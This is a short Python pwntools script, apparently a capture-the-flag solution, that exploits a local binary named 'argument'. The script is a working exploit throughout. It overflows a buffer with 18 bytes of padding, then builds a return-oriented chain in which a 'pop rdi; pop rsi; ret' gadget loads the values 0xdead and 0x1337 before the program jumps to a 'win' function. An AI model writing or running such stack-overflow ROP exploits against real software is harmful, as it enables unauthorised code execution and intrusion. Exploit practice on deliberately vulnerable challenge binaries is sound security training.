from pwn import *

p = process("./argument")

gadget = 0x0000000000401156 # pop rdi ; pop rsi ; ret
win = 0x401159
p.sendline(b"A"*(18) + p64(gadget) + p64(0xdead) + p64(0x1337) + p64(win))

p.interactive()